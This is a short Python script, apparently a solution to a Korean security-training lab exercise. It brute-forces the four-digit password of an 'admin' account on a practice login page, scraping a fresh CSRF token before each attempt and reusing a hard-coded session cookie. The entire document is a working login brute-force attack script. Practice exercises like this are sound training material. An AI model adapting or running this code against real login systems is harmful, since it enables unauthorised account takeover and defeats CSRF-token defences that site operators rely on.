#쇼핑몰 3번

import requests
from bs4 import BeautifulSoup

url = "https://elms2.skinfosec.co.kr:8110/practice/practice03/login"
login_url = url 

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

cookies = {
    "JSESSIONID" : "A076AACC847B94E58E5E325FB4676924"
}

# 세션을 사용하여 쿠키를 관리합니다.
session = requests.Session()

# 비밀번호를 시도하는 루프
for i in range(1, 9999):
    pw = str(i).zfill(4)

    # 로그인 페이지에 GET 요청을 보내서 CSRF 토큰과 쿠키를 얻습니다.
    response = session.get(login_url,cookies=cookies)
    
    # BeautifulSoup을 사용하여 CSRF 토큰을 추출합니다.
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token_element = soup.find('input', {'name': '_csrf'})  # 이 부분을 실제 페이지에 맞게 수정
    if csrf_token_element:
        csrf_token = csrf_token_element['value']
    else:
        print("CSRF 토큰을 찾을 수 없습니다.")
        break

    # POST 데이터에 CSRF 토큰과 현재 시도하는 비밀번호를 포함시킵니다.
    data = {
        "_csrf": csrf_token,
        "memberid": "admin",
        "password": pw
    }

    # POST 요청을 보내서 로그인 시도합니다.
    response = session.post(url, headers=headers, cookies=cookies,data=data)

    if "로그인에 실패" in response.text:
        print("비밀번호 [{}] 로그인 실패".format(pw))
    else:
        print("비밀번호 [{}] 로그인 성공!!!".format(pw))
        break
